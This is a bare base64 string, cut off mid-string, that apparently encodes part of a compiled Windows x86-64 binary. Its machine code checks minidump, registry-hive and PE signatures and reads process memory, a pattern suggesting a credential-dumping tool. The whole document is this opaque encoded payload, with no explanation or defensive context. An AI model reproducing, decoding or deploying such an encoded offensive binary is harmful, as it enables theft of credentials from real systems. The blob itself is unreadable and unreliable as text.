Y6x+6CAAAAI1KOP8VaMADAEiLD0iFwEiJQQjro7sBAAAAhdt1CUiLD/8VWsADAEiLdCQ4i8NIi1wkMEiDxCBfw0iJXCQIV0iD7CBIi9lIhcl0WosRg+oBdA+D6gF0H4PqAXQFg/oDdQpIi0kI/xUWwAMASIvL/xUNwAMA6zFIi0EISIXAdOxIizhIi08ISIXJdAb/FcjAAwBIiw9Ihcl0Bv8VGsADAEiLSwjrwDPASItcJDBIg8QgX8PMzMxIiVwkEEyJRCQYVVZXSIvsSIPsYDPbSI1F8EiL+old8EiLUQhIi/FIiV34SIld4EiJReiLCoXJD4QRAQAAg+kBD4STAAAAg+kCdF+D+QMPhdABAABIi0cIORgPhZ4AAABIOR50IUiLSghFM8mLFkUzwEiLCf8V8r8DAIXAD4SiAQAATItFMEiLRghMjU0gSIsXSIlcJCBIi0gISIsJ/xU5vwMAi9jpegEAAEiLRwg5GHVMSItKCEWLyIlcJDC6h8EiAEiJXCQoTIsHSIsJSIl0JCDopfD//+vKSItHCDkYdR1Ii0oITYvITIsHSIsWSIlcJCBIiwn/FVC/AwDrpUmL0LlAAAAA/xWwvgMASIlF4EiFwA+ECwEAAEyLRTBIjU3gSIvX6Nf+//+FwHQSTItFMEiNVeBIi87ow/7//4vYSItN4P8Vg74DAOnWAAAASItXCIsKhckPhLgAAACD6QEPhI8AAACD6QF0cIPpAXRNg/kDD4WsAAAASItKCEUzyYsXRTPASIsJ/xXfvgMAg/j/D4SOAAAASItHCEyNTSBEi0UwSIsWSIlcJCBIi0gISIsJ/xUdvgMA6ef+//9Ii0oISI1FMIlcJDBFM8lIiUQkKLqDwSIA6e3+//9Ii0oITYvITIsHSIsWSIsJ6MkFAADpr/7//0iLSghNi8hMiwZIixdIiVwkIEiLCf8Vdb4DAOmP/v//SIsXSIsO6DWmAwC7AQAAAIvDSIucJIgAAABIg8RgX15dw8zMSIvESIlYIEyJQBhIiVAQSIlICFVWV0iL7EiD7GBFM9tIjUXQSYvwSIlF6E2LQBBMi8lIi0EIQYv7RIld0EiLHkyJXdhMiV3gTIlF8E6NFANMiV34TIlVyEQ5GHUiSItWCIsKhckPhN8AAACD6QF0coPpAXQug+kBdGiD+QN0Y0iLXSCLx/fYi8dIG8lII8tIi5wkmAAAAEiJThhIg8RgX15dw0iLSghIi9NIiwno9gUAAEiJReBIhcB0xEiLVShMjUXgSItNIEUzyegx////i/iFwHSqSIseSCtd4EgDXfjroUmL0LlAAAAA/xWUvAMASIlF4EiFwHSGTItGEEiNTeBIi9bov/z//4XAdCpIi1UoTI1F4EiLTSBFM8no3/7//4v4hcB0EEiLHkiLTeBIK9lIA1346whIi03gSItdIP8VT7wDAOk5////SIt1KEiNBDNIiUXASTvCdzBJiwlMi8ZIi9PoQ6oDAEyLTSAz/0yLVciFwEiLRcBAD5THSP/ASP/DSIlFwIX/dMtIi3UwSP/L6ez+///MTIvcSYlbEFdIg+xAM9tJiUsgSIkZSIv5SItJCMdEJFAIAAAARIsJRYXJdFhBg+kBdDNBg/kCdWBIi0kISY1DCIlcJDBEi8pJiUPgRTPASY1DILqLwSIASIsJSYlD2OhJ7f//6zNIi0kIQbkAEAAARIlEJCBMi8Iz0kiLCf8VKrwDAOsRRYvIM8lBuAAQAAD/Ff+7AwBIiQdIOR8PlcOLw0iLXCRYSIPEQF/DzEBTSIPsQEyL0TPbSItJCIsRhdJ0TIPqAXQsg/oCdVVIi0kIRTPJTYsCuo/BIgCJXCQwSIlcJChIiwlIiVwkIOi87P//6y5Ii0kIQbkAgAAASYsSRTPASIsJ/xWxuwMA6xFJiwoz0kG4AIAAAP8VnrgDAIvYi8NIg8RAW8NIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+wgM/9Ii9lIi0kITIvaRIvXRIsBRYXAD4TKAAAAQYPoAQ+EpQAAAEGD+AEPhdAAAABIi0kIjXcQi9ZIiwnoLAIAAEiL0EiFwA+EswAAAIvPSDl4CA+GpwAAAI1vJESNdxhEjX8IRI1nIESNbyhFhdIPhYsAAABMiwdMOQNyP02LDkuNBAFIOQN3M0mLB0G6AQAAAEmJQwiLBkGJQxCLRQBBiUMkQYsEJEGJQyBBi0UAQYlDKE2JA02JSxjrA0SL1//Bi8FIO0IIcqPrNUiLSQhMi8JIixNBuTAAAABIiwn/FaW6AwDrD0iLC0G4MAAAAP8VjLoDAEiD+DBEi9dBD5TCSItcJFBBi8JIi2wkWEiLdCRgSIPEIEFfQV5BXUFcX8PMSIlcJBBXSIPsMEiL+UUz0kiLSQhJi9lEixlFhdt0KEGD+wF1QkiLSQhIjUQkQEWLyEiJRCQgTIvCSIsXSIsJ/xX7uQMA6w5Iiw9MjUwkQP8Vy7kDAESL0IXAdAtIhdt0BotEJECJA0GLwkiLXCRISIPEMF/DzMzMSIlcJAhIiXQkEFdIg+wwM/9Ii9pIi/GNVxCNT0D/Fe24AwBIiQNIhcAPhJMAAABIIXwkKESNRwIhfCQgRTPJM9JIi87/Fba5AwBIi8hIiwNIiQhIiwNIiwhIhcl0REghfCQgjVcERTPJRTPA/xWWuQMASIvISIsDSIlICEiFyXQhSIsDSItICIE5TURNUHUSuJOnAABmOUEEdQe/AQAAAOsgSIsbSItLCEiFyXQG/xVEuQMASIsLSIXJdAb/FZa4AwBIi1wkQIvHSIt0JEhIg8QwX8NMi0kIM8BFi0EMTQPBQTlBCHYTSYvIORF0D//ASIPBDEE7QQhy8DPAw0iNDEBBi0SICEkDwcPMzEiLxEiJWAhIiWgYSIlwIEiJUBBXQVRBVUFWQVdIg+wwM9tNi+lJi/BIiVwkIEyL0USL241TCeiN////TIv4SIXAD4TCAAAASItoCESL40kDaghIORgPhqgAAABIjXgQSIsPSIl8JChIO/FyDUiLVwhIjQQKSDvwcihOjQQuTDvBcg1Ii1cISI0ECkw7wHISSDvxc1ZIi1cISI0ECkw7wHZJSDvxcwhMi8NIK87rCUyLxkwrwUiLy02L9Uwr8UuNBAZIO8J2BkyL8k0r8EgDTCRoSY0UKE2Lxui/nwMATItcJCBNA95MiVwkIEiLRCQoSf/ESIPHEEgDaAhNOycPglz///9NO90PlMNIi2wkcIvDSItcJGBIi3QkeEiDxDBBX0FeQV1BXF/DSIvESIlYCEiJaBBIiXAYSIl4IEFUQVZBV0iD7CAz7UiL+k2L4EiL2UUz2zP2RTPSjVUJ6Gj+//9IhcB0cUyLQAhMA0MIM9tMizBNhfZ0X0iNUBBIiwpMi/pIO/lyI0yLSghJjQQJSDv4cxFNi9FNi9hMK9dJi/FMA9HrGkg7+XMYTYXbdChIjQQuSDvIdR9Ii3IITAPWSIvpTTvUczFNA0cISP/DSIPCEEk73nKlM8BIi1wkQEiLbCRISIt0JFBIi3wkWEiDxCBBX0FeQVzDSYvD69xIi8RIiUgISIlQEEyJQBhMiUggU1VXQVZIg+w4SIM9LDkHAABIjWgQSIvZD4TcAAAA6GqS//9IiWwkKEyLy0iDZCQgAEUzwDPSSIv4SIsISIPJAuh8LwIAQYPO/4XAQQ9IxoXAD46eAAAATIsF7zgHAEiLDeA4BwBIY9BJi8BIK8FI/8hIO9B2RkiLDcA4BwBKjQQCSI0cRQIAAABIjRQbRY1GA/8VXrYDAEyLBa84BwBIhcBIiw2dOAcATA9Fw0iJBYo4BwBMiQWTOAcA6wdIiwV6OAcATItMJGBIjRRITCvBSIlsJChIiw9Ig2QkIADoFzECAIXAQQ9IxoXAfglImEgBBVA4BwBIi1wkYEiLPTQ4BwBIhf90IuiCkf//RTPJSIlsJCBMi8NIi9dIiwjosC0CAEiLPQ04BwBIi8/omTYCAEiDxDhBXl9dW8PMzMxIiVwkCEiJdCQQV0iD7CAz20iL8Yv7SIXJdB1IjRUCPQUA6LU5AgBIi/hIhcB1CUiLPcI3BwDrHUiLDbk3BwBIhcl0BegLNwIASIk9qDcHAEiF9nQFSIX/dAW7AQAAAEiLdCQ4i8NIi1wkMEiDxCBfw8zMzEiJXCQQSIl0JBhVV0FUQVVBVkiL7EiB7IAAAABIi0EIRTP2TDl1YE2L0EyL2kiJRahIjUXARIl1wEiL2UiJRbhMi8FMiXXIRYvmTIl1oEmL0kyJdbBJi8tEiXUwQQ+UxE2L6UGL/kGL9uhS9v//hcAPhAYBAABIY0VYQb5AAAAASANDGEiLXVBIiUWgRYXkdTFIi9NBi87/FaezAwBIiUWwSIXAD4TSAAAATIvDSI1VoEiNTbDozvP//4XAD4S6AAAASI1V0EiNTaDosfj//4XAD4SWAAAAi030i8GD4A9Ei8H/yEGB4AD///+D+AJ3CEG+BAAAAOsNgeHwAAAA/8mD+T53GkULxkyNTTBIi9NIjU2g6KT5//+FwHRRi3UwTIvDSI1NoEmL1eha8///i/iFwHQjSIN9YAB0HEiLVXCLTWj/VWBMi8NIjVWwSI1NoOgz8///i/iF9nQSRTPJSI1NoESLxkiL0+hP+f//SItNsEiFyXQG/xXYsgMATI2cJIAAAACLx0mLWzhJi3NASYvjQV5BXUFcX13DzMxIiVwkCEiJdCQYVVdBVEFWQVdIjWwk0UiB7PAAAABFM/ZIjUWPRCF1jzP/TCF1l02L4Uwhda9Ni/hMIXWfTIvSSIlFt0iNRY9IiUWnM8BIhdIPhIYBAACLFWc4BwA5EXcPSIv5SP/ASIPBUEk7wnLtSIX/D4RkAQAASItHEEiNFfRVBQBIiUWvQbgBAAAASItHIDPJSIlFn/8VAq4DAEiFwHQPTIvASI1V/0mLz+jOMwAAhcAPhA0BAACDfQMED4L6AAAARItFGzPSuTgEAAD/FVOyAwBIi/BIhcAPhM4AAAC6EAAAAI1KMP8VubEDAEiJRWdIi9hIhcB0EUyNRWdIi9a5AQAAAOiM8P//hcAPhNUAAABMjUW/SYvUSIvL6KEIAACFwHRqTCF0JEBMjU2fi0XPSI1Vr0QhdCQ4i08YDxBFv0whdCQwRItHCEiJRe+LRyiJRCQoSIlMJCBIjU3f8w9/Rd/o+vz//0SL8IXAdBFJi9dIjQ2dOQUA6CD7///rI/8VWLEDAEiNDcE5BQDrDf8VSbEDAEiNDVI6BQCL0Oj7+v//SIvL6MPw///rOv8VK7EDAEiNDSQ7BQDrFkiNDbs7BQDrHf8VE7EDAEiNDUw8BQCL0OjF+v//6wxIjQ38PAUA6Lf6//9MjZwk8AAAAEGLxkmLWzBJi3NASYvjQV9BXkFcX13DSIlcJAhIiWwkEEiJdCQYV0iD7CBIi/KL6UiLErsEAADASIXSdBBFM8lFM8D/Fb6zAwCL2OtEvwAQAACL17lAAAAA/xVYsAMASIkGSIXAdCpFM8lEi8dIi9CLzf8Vj7MDAIvYhcB5CUiLDv8VQLADAAP/gfsEAADAdMFIi2wkOIvDSItcJDBIi3QkQEiDxCBfw8zMzEiLxEiJaAhIiXAQSIl4IEFWSIPsIEiDYBgASIvqTIvxSI1QGLkFAAAA6D7///+L8IXAeCxIi3wkQEiLz+sNgz8AdBKLB0gD+EiLz0iL1UH/1oXAdelIi0wkQP8VvK8DAEiLbCQwi8ZIi3QkOEiLfCRISIPEIEFew0iJXCQIV0iD7CBIi9pIi/lIixJIg8E4QbAB/xWssgMARA+2wDPARIlDEEWFwHQKTItDCItPUEGJCDlDEEiLXCQwD5TASIPEIF/DzMxMi9xTSIPsUEmJU+BJjUPISIvRSYlD2DPbSY1LyIlcJED/FWGyAwBIjVQkMEiNDYH////oBP///4XAD0lcJECLw0iDxFBbw8xIi8RIiVgQSIlwGEiJeCBVQVRBVUFWQVdIjagI////SIHs0AEAAEUz/0iJTCRYSIvxSIlMJDiLCUiNRYBEiX2ATYvgTIl9iEWNdwFMiXwkYEGL/kiJRCRoTIvqTIl8JFC7NQEAwEyJvQABAACFyQ+E8gMAAEErzg+EggEAAEErzg+E0wAAAEE7znQKuwIAAMDpxAQAAEiNlQABAAC5CwAAAOi6/f//i9iFwA+IqQQAAEiLtQABAABIjUQkIEiJRCRIRYv3RDk+D4aMBAAAhf8PhIQEAABBi8ZIacgoAQAASItEMRhIiUQkMItEMSCJRCRAD7dEMS5IA8FIjU4wSAPIdEZIg8r/SP/CRDg8EXX36Gw0AABMi/hIhcB0KUiL0EiNTCQg/xUWsQMAg2QkRABIjUwkMEmL1EH/1UmLz4v4/xXLrQMARTP/Qf/GRDs2D4J5////6QAEAABIi04ISI1EJCBIiUQkSLoEAAAASIsJ6FD1//9Mi/BIhcAPhNkDAABBi99EOTgPhsoDAACF/w+EwgMAAIvLSGvRbEqLRDIESIlEJDBCi0QyDIlEJEBIi0YISIsIQotEMhhIA0EIdDS6XAAAAEiNSATo0+ABAEiNTCQgSI1QAv8VZLADAEiNTCQw6JYDAABJi9RIjUwkMEH/1Yv4/8NBOx5ykulXAwAASI1EJCBFM8BIjVWQSIlEJEhIi87ocAQAAIXAD4Q5AwAASI2FkAAAAEG4QAAAAEiJRCRgSI1UJFBIi0WoSI1MJGBIiUQkUOj67P//hcAPhAcDAABIi42wAAAASItdqEiDwfBIg8MQ6cAAAACF/w+EwQAAAEiNRfBIiUwkUEiNTCRgSIlEJGBBuGgAAABIjVQkUOiv7P//i/iFwA+EgwAAAEiLRSC5QAAAAA8QRUhIiUQkMItFMIlEJEBmSA9+wEjB6BAPt9APEUQkIP8VMawDAEiJRCQoSIXAdElED7dEJCJIjVQkUEiJRCRgSI1MJGBIi0VQSIlEJFDoSOz//4XAdBdIjUwkMOhyAgAASYvUSI1MJDBB/9WL+EiLTCQo/xXuqwMASItNAEiDwfBIO8sPhTf///9Bi9+F/w+EGwIAAEWLxkiNVCRwSIvO6DoDAACFwA+EAwIAAEiNRWBBuCQAAABIiUQkYEiNVCRQi0QkfEiNTCRgSIlEJFC7DQAAgOjC6///hcAPhM8BAACLRXSLXCR8SIPoCEiDwwzpugAAAIX/D4SwAQAASI1NsEiJRCRQSIlMJGBIjVQkUEiNTCRgQbg0AAAA6Hvr//+FwA+EgAAAAItFyLlAAAAASIlEJDCLRdCJRCRAD7dF3GaJRCQgD7dF3ovQZolEJCL/FQGrAwBIiUQkKEiFwHRIRA+3RCQiSI1UJFBIiUQkYEiNTCRgi0XgSIlEJFDoGev//4XAdBdIjUwkMOhDAQAASYvUSI1MJDBB/9WL+EiLTCQo/xW/qgMAi0W4SIPoCEg7ww+FPf///+nwAAAARTPASI1VkEiLzugTAgAAhcB0VkiLRahIi1gg6zyF/3RFSItDMEiNTCQwSIlEJDCLQ0CJRCRASI1DWEiJRCRI6NIAAABJi9RIjUwkMEH/1UiLWxCL+EiLRahIg+sQSIPAEEg72HW3QYvfSI1EJCBIiUQkSIX/dHyF23h4RYvGSI1UJHBIi87olwEAAIXAdGSLRCR8i1gU60uF/3RUi0MYSI1MJDBIiUQkMItDIIlEJEAPt0MsZolEJCAPt0MuZolEJCKLQzBIiUQkKOhHAAAASYvUSI1MJDBB/9WLWwiL+ItEJHxIg+sISIPAEEg72HWoQYvfTI2cJNABAACLw0mLWzhJi3NASYt7SEmL40FfQV5BXUFcXcNAU0iD7CBIjVQkMEiL2egFAgAAhcB0F0iLTCQwi0EIiUMUSIPEIFtI/yVmqQMAg2MUAEiDxCBbw0iJXCQIV0iD7CBIi9pIi/lIixJBsAFIi0kY/xVkrAMARA+2wDPARIlDEEWFwHQUTItDCA8QB0EPEQAPEE8QQQ8RSBA5QxBIi1wkMA+UwEiDxCBfww8QATPADxECDxBJEA8RShDDzMzMTIvcSYlbCFdIg+xQM9tNiUPgSY1DyEiL+UmJQ9iJXCRASIXSdChJjUvI/xX0qwMATI1EJDBIi89IjRVZ////6KD5//+FwHgXi1wkQOsRSI0Vl////+iK+f//hcAPmcOLw0iLXCRgSIPEUF/DSIlcJAhIiXQkEFVXQVRBVkFXSI1sJMlIgeyQAAAAM9tFi/iDOQFIi/JIi/l1CUiLQQhMixDrCf8Vq6gDAEyL0Ild50iNRedIiUX/SIld70iJdfdIiV3XSIl930WF/3QTuhoAAABMjUUPRI1y7kSNYvbrEEG+MAAAAEyNRQeL00WNZvCLD4XJdGGD+QF1PkiNRXdFi85Ji8pIiUQkIP8VLasDAIXAeCVEOXV3dR9Ii0UPSIXAdBZFi8RIjVXXSI1N90iJRdfo8uf//4vYTI2cJJAAAACLw0mLWzBJi3M4SYvjQV9BXkFcX13DRYX/dZ//FeOqAwBBjV8BDxAADxEGDxBIEA8RThDrw8zMzEiLxEiJWAhIiXAQSIl4GFVIjWihSIHsoAAAADPbSI1FFyFdB0iL8kghXQ9Ii/lIIV3nSIvRSCFd90SNQ0BIiUXXSI1FB0iJRd9IjUUHSIlF70iLQQhIjU3XSIlF/+hO5///hcAPhJ4AAAC4TVoAAGY5RRcPhY8AAABIY0VTjUtASAMHjXsYi9dIiUX3/xXapgMASIlF10iFwHRtRIvHSI1V90iNTdfoBef//0iLRdeNS0C6CAEAAESNSkRmRDlIBESNQvBBD0TQi/r/FZymAwBIiUXnSIXAdCVEi8dIjVX3SI1N5+jH5v//SItN54vYhcB0BUiJDusG/xV+pgMASItN1/8VdKYDAEyNnCSgAAAAi8NJi1sQSYtzGEmLeyBJi+Ndw8xIiVwkEEiJdCQYVVdBVEFWQVdIi+xIg+xQDxABRTP/i/JEIX3gSI1F4EwhfehIjVUwTCF90EmL+fMPf0XwTYvwSIlF2EyL4eiQ/v//hcAPhKYAAABIi01QSItdMEiFyXQHD7dDBGaJAbhMAQAAZjlDBHUKi0zzfIt083jrDouM84wAAACLtPOIAAAATYX2dANBiTZIhf90AokPhfZ0U4XJdE9Ii31YSIX/dEZEi/GL0blAAAAA/xWNpQMASIkHSIXAdC6L1kiNTdBJAxQkRYvGSIlV8EiNVfBIiUXQ6Kvl//9Ei/iFwHUJSIsP/xVnpQMASIvL/xVepQMATI1cJFBBi8dJi1s4SYtzQEmL40FfQV5BXF9dw8zMSIvESIlYCEiJcBBIiXgYTIlwIEFXSIHs0AAAAEWL+EiL8ov5RTP2M9JIjUiIQYPPEEGNXmhEi8PoC+EBAIlcJGBMObQkIAEAAHQKSIucJCABAADrEboYAAAAjUoo/xXNpAMASIvYSIvO6DYhAgBIi/BIhcAPhBsBAACF/w+EmAAAAIPvAXRZg/8BD4XBAAAARIuMJAABAABIjUQkYEyLhCQYAQAASIuUJBABAABIi4wkCAEAAEiJXCRQSIlEJEhMIXQkQEwhdCQ4RIl8JDBIiXQkKEwhdCQg/xXanwMA625IiVwkUEiNRCRgSIlEJEhFM8lMIXQkQEyLxkwhdCQ4M9JEiXwkMDPJRCF0JChMIXQkIP8VmJ8DAOs0SIlcJEhIjUQkYEiJRCRARTPJTCF0JDhFM8BMIXQkMEiL1kSJfCQoM8lEIXQkIP8V6qQDAESL8IO8JCgBAAAAdQtIg7wkIAEAAAB1J0iLSwj/FQikAwBIiwv/Ff+jAwBIg7wkIAEAAAB1CUiLy/8Vs6MDAEiLzuiTIAIATI2cJNAAAABBi8ZJi1sQSYtzGEmLeyBNi3MoSYvjQV/DzMxIiVwkCEiJVCQQVVZXQVRBVUFWQVdIi+xIgeyAAAAASI1FuE2L6EiJRCQoTI1NWEiNRcAz0kyNRbBIiUQkIEyL+UG+AQAAAOjk/P//hcAPhPgAAABJi0cIM/ZIi124SIlF6EiJRfg5cxQPhtQAAABEi2VYi32wRYX2D4TEAAAAi0scK89Ei8ZJweACSQPIixQZhdIPhJ8AAACLQxxFM8lJAwdJA8BMiU3QSIlF4EUzwEQhRciNRgGJRcREOUMYdj5Nhcl1OUWF9nQ0i0skK89IA8tCD7cEQTvwdRqLSyArz0gDy0aLDIFEK89EiUXITAPLTIlN0EH/wEQ7QxhywjvXchpCjQQnO9BzEkiDZfAAK9eLwkgDw0iJRdjrD0iLwkkDB0iDZdgASIlF8EmL1UiNTcD/VUhEi/D/xjtzFA+CM////0iLy/8VPKIDADPASIucJMAAAABIgcSAAAAAQV9BXkFdQVxfXl3DzMzMSIlcJBBIiXwkGFVIi+xIg+xwg2XAAEiNRcBIg2XIAEyNReBIg2WwAEiL+UiDZfgAugEAAABIiUW4SI1FEEiJRdBIjUXASIlF2EiLAUiJReBIi0EISI1N0EiJRejGRRAASMdF8AQBAADoG+T//4XAdD9Ii134uUAAAABIKx9IjVMB/xWFoQMASIlFsEiFwHQkTI1DAUiL10iNTbDosOH//4XAdQxIi02w/xVuoQMA6wRIi0WwTI1cJHBJi1sYSYt7IEmL413DzMxMiUQkGEiJVCQQVVNWV0FUQVVBVkFXSI1sJOFIgezIAAAAM/ZIjUVvSIlF90yL4UiNReeJdedIiUX/RTPJSI1FZ0iJde9IiUUHRTPASI1F50iJdYdIiUUPSItBCI1OAUiJRY9Ei+lIiUWfi9FIiUXPSYvMSIlF30iNRX9IiUQkKEiNRadIiUQkIEiJdZfoavr//4XAD4RQAQAAuEwBAABmOUWndQxEjX4EQb4AAACA6xBBvwgAAABJvgAAAAAAAACASIt9f0iL3zk3D4QRAQAASIt9d0WF7Q+EAAEAAItDDEiNTZdJAwQkSIlFl+hH/v//SIlFr0iFwA+E0wAAAIsDSQMEJEiJRYeLQxBJAwQkSIlFx0GL90WLx+mSAAAATIvGSI1Vx0iNTQfoWuD//4XAD4SPAAAASItNb0iFyQ+EggAAAEiLRWdIhcB0eUiJRddMhfF0DUiDZb8AD7fBiUW36x1Ig8ECSQMMJEiJTZdIjU2X6MH9//+DZbcASIlFv0iL10iNTafoAU4BAEiLTb9Ei+hIhcl0Bv8Vt58DAEgBdYdMi8aDZXMASAF1x4NlawBIjVWHSI1N9+jL3///hcAPhVn///9Ii02v/xWFnwMAM/ZIg8MUOTMPhff+//9Ii31/SIvP/xVqnwMAuAEAAABIgcTIAAAAQV9BXkFdQVxfXltdw8xIi8RIiVgISIloEEiJcBhIiXggQVZIg+wwSYsBM/9Ji/FBi+hMi/KJCIXJD4QWAQAAg/kBD4UCAQAAjVcgjU9A/xX6ngMASIvISIsGSIlICEiFyQ+E4wAAAEiL2EiJfCQoi8WJfCQg99hJi85FG8BFM8lBg+ACM9JBg8AC/xWunwMASIvISItDCEiJCEiLQwhIOTgPhKMAAABIiwj33UiLHhvSSIl8JCCD4v5FM8mDwgRFM8D/FX6fAwBIi8hIi0MISIlICEiLQwhIi0gISIXJdGqBOXJlZ2Z1RDl5HHU/SIHBABAAAIE5aGJpbnUwSIlIEEhjQQRIg8EgSAPISItDCEiJSBhIi0MISItIGLhuawAAZjlBBHUG9kEGDHUpSItLCEiLSQj/FfyeAwBIiwZIi0gISIsJ/xVMngMASIsO/xULngMA6wW/AQAAAEiLXCRAi8dIi3wkWEiLbCRISIt0JFBIg8QwQV7DzMzMQFNIg+wgSIvZSIXJdEiDOQF1NEiLQQhIhcB0K0iLSAhIhcl0Bv8VkZ4DAEiLQwhIiwhIhcl0Bv8V350DAEiLSwj/FZ2dAwBIi8tIg8QgW0j/JY6dAwAzwEiDxCBbw8zMSIlcJBBEiUwkIFVWV0iD7EBIi7wkiAAAADPbSIvxRYvZSYvoTIvSSCEfiwmFyQ+EFwEAAIP5AQ+FOwEAAEiF0nUISItGCEyLUBi4bmsAAGZBOUIED4XnAAAATYXAD4TbAAAAQTlaGA+E1AAAAEGDeiD/D4TJAAAASItGCLpcAAAASWNaIEmLyEgDWBBIiVwkYOgu0QEASIlEJDBIhcAPhIcAAABIK8W5QAAAAEjR+EgDwEiJhCSIAAAASI1QAv8VsJwDAEiL2EiFwHR1TIuEJIgAAABIi9VIi8joLYUDAEiLVCRgTIvDSIvO6JkAAABIiQdIi9BIhcB0JouEJIAAAABIi85Mi0QkMESLTCR4SYPAAkiJfCQoiUQkIOjg/v//SIvL/xVbnAMA6xZMi8VIi9NIi87oTwAAAEiJB+sDTIkXM9tIOR8PlcPrLUSLjCSAAAAARYvDSIvVSIl8JCBJi8r/Fa2XAwCFwA+Uw4XbdQiLyP8VDJ0DAIvDSItcJGhIg8RAX15dw8xIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+wgD7dCBEUz7QWUmf//TYvgTIvyTIv5QYvtqf/9//8PhZ8AAABBi/VmRDtqBg+DkQAAAEiF7Q+FiAAAAIvGSWNcxghJi0cISANYELhuawAAZjlDBHVf9kMGIA+3U0x0DkiNS1Do6SEAAEiL+OsoSIPCArlAAAAA/xVVmwMASIv4SIXAdDBED7dDTEiNU1BIi8jo1IMDAEiF/3QaSIvXSYvM6CwYAgCFwEiLz0gPROv/FS2bAwBBD7dOBv/GO/EPgm////9Ii1wkUEiLxUiLbCRYSIt0JGBIg8QgQV9BXkFdQVxfw8zMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsYDPtTIvSixFJi/FNi/BMi8mL3YXSD4TXAAAAg/oBD4VBAQAATYXSdQhIi0EITItQGLhuawAAZkE5QgQPlMOF2w+EHwEAAEiLjCSYAAAASIXJdAZBi0IYiQFIi4wkoAAAAEiFyXQIQYtCONHoiQFIi4wksAAAAEiFyXQGQYtCKIkBSIuMJLgAAABIhcl0CEGLQkDR6IkBSIuMJMAAAABIhcl0BkGLQkSJAUiF9g+EswAAAEEPt0JOi/jR702FwHQuOT6L3Q+Xw4XbdCNJY1I0RIvASYtBCEiLSBBIg8EESAPRSYvO6IOCAwBmQYksfok+63NIi4QkwAAAAEUzyUiJbCRYTIvGSIlsJFBJi9ZIiUQkSEmLykiLhCS4AAAASIlEJEBIi4QksAAAAEiJRCQ4SIuEJKAAAABIiWwkMEiJRCQoSIuEJJgAAABIiUQkIP8VOJUDAIXAD5TDhdt1CIvI/xV/mgMATI1cJGCLw0mLWxBJi2sYSYtzIEmLeyhJi+NBXsPMzEiJXCQISIlsJBBIiXQkGFdBVEFVQVZBV0iD7CBIi/JNi+gz0kyL+Yv6SIX2dQhIi0EISItwGLhuawAAZjlGBA+F2QAAAItOKIXJD4TOAAAAg34s/w+ExAAAAEmLRwhEi/JMY2YsTANgEIXJD4StAAAASIX/D4WkAAAAQYvGSWNchARJi0cISANYELh2awAAZjlDBHV8TYXtdG8Pt0MGZoXAdG72QxQBD7fQdA5IjUsY6BsfAABIi+jrKkiDwgK5QAAAAP8Vh5gDADPSSIvoSIXAdD5ED7dDBkiNUxhIi8joBIEDADPSSIXtdCZIi9VJi83oWhUCAIXASIvNSA9E+/8VW5gDADPS6whmOVMGSA9E+0H/xkQ7digPglP///9Ii1wkUEiLx0iLbCRYSIt0JGBIg8QgQV9BXkFdQVxfw8zMSIlcJAhIiXQkEEiJfCQYQVZIg+wwRIsJM9tNi9BMi9pMi/FFhcl0cUGD+QEPhZ4AAADoif7//0iFwA+Vw4XbD4SLAAAAi3gISIt0JHAPuvcfSIX2dHpIi0wkaEiFyXQ1M9s5Pg+Tw4XbdCr3QAgAAACAdAZIjVAM6xNMY0AMSYtGCEiLUBBIg8IESQPQRIvH6BOAAwCJPus3SItEJHBFM8lIiUQkKEUzwEiLRCRoSYvSSYvLSIlEJCD/FeGSAwCFwA+Uw4XbdQiLyP8VUJgDAEiLdCRIi8NIi1wkQEiLfCRQSIPEMEFew0iJXCQIV0iD7DBEiwkz202L0EyL2kiL+UWFyXR3QYP5AQ+FpAAAAOis/f//SIvISIXAD4STAAAAi1AIRIvCQQ+68B9EO0QkcA+Tw4XbdD6LRCRgiUEQuAAAAIAj0AtUJHCJUQiF0HQGSIPBDOsTSGNRDEiLRwhIi0gQSIPBBEgDykiLVCRo6DV/AwDrPrkyAAAA6zGLRCRwRTPARItMJGBJi9KJRCQoSYvLSItEJGhIiUQkIP8VFpIDAIXAD5TDhdt1CIvI/xVtlwMAi8NIi1wkQEiDxDBfw0iLxEiJWAhIiWgQSIlwGEiJeCBBVEFWQVdIg+xARIsRRTPkRYvYTYvxSIvqQYv8RYXSD4T/AAAAQYP6AQ+FMgEAAEQ5YhgPhCgBAABEO1oYD4MeAQAAg3og/w+EFAEAAEiLQQhIY0ogTItAEEkDyA+3QQQFlJn//6n//f//D4XxAAAAZkQ5YQYPhOYAAAAPt0EGRDvYD4PZAAAASmNU2Qi4bmsAAEkD0GY5QgQPhcIAAABNhckPhLkAAABIi7QkgAAAAEiF9g+EqAAAAPZCBiB0Ow+3Wkw5HkAPl8eF/3RTSI1KUIvT6OUbAABIi+hIhcB0O0yNBBtIi9BJi87o5n0DAEiLzf8VVZUDAOshD7daTNHrOR5AD5fHhf90FkQPt0VMSIPCUEmLyei6fQMAZkWJJF6JHus9TIuMJIAAAABNi8ZMiWQkOEGL00yJZCQwSIvNTIlkJChMiWQkIP8VnpADAIXAQA+Ux4X/dQiLyP8V7JUDAEiLXCRgi8dIi3wkeEiLbCRoSIt0JHBIg8RAQV9BXkFcw8zMzEiJXCQISIlsJBBIiXQkGFdBVEFVQVZBV0iD7EBFM+1Fi9hMi9JNi+GLEUyL+UGL/YXSD4SRAQAAg/oBD4XdAQAATYXSdQhIi0EITItQGLhuawAAZkE5QgQPhcABAABFOWooD4S2AQAARTtaKA+DrAEAAEGDeiz/D4ShAQAASItBCEljSixIA0gQSmNcmQRIA1gQuHZrAABmOUMED4V9AQAATYXJD4R0AQAATIu0JJAAAABNhfYPhGMBAAAPt0MGZoXAD4SCAAAA9kMUAQ+38A+30HQQ/8ZIjUsY6FkaAABIi+jrMNHuSIPCArlAAAAA/8b/FcGTAwBIi+hIhcAPhBsBAABED7dDBkiNUxhIi8joPHwDAEiF7Q+EAQEAAEE5NkAPk8eF/3QXRIvGSIvVTQPASYvM6Bd8AwCNRv9BiQZIi83/FYCTAwDrA0WJLoX/D4TJAAAAi3MISIuMJKAAAAAPuvYfSIXJdAWLQxCJAUyLtCSwAAAATYX2D4SfAAAASIuMJKgAAABIhcl0OEE5NkGL/UAPk8eF/3Qq90MIAAAAgHQGSI1TDOsTSYtHCExjQwxIi1AQSIPCBEkD0ESLxuiMewMAQYk261VIi4QksAAAAE2LxEyLjCSQAAAAQYvTSIlEJDhJi8pIi4QkqAAAAEiJRCQwSIuEJKAAAABIiUQkKEyJbCQg/xVEjgMAhcBAD5THhf91CIvI/xWqkwMATI1